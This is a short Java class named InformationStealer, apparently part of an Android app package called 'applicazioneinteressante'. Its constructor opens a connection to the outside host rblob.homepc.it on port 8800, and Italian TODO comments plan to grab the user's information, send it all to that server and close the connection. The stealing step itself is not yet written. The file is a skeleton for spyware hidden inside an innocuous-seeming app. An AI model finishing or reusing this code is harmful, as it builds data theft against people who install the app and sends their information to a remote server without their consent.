package com.example.applicazioneinteressante;

public class InformationStealer {

    NetworkManager conn = new NetworkManager();
    public InformationStealer(){
        conn.openConnection("rblob.homepc.it", 8800);
    }
    /*
    TODO:
     Fotti info
     manda al server tramite conn.sengMessage(info) (Info da mandare probabilmente tutte insieme per una gestione migliore lato server)
     chiudi la connessione
    */
}

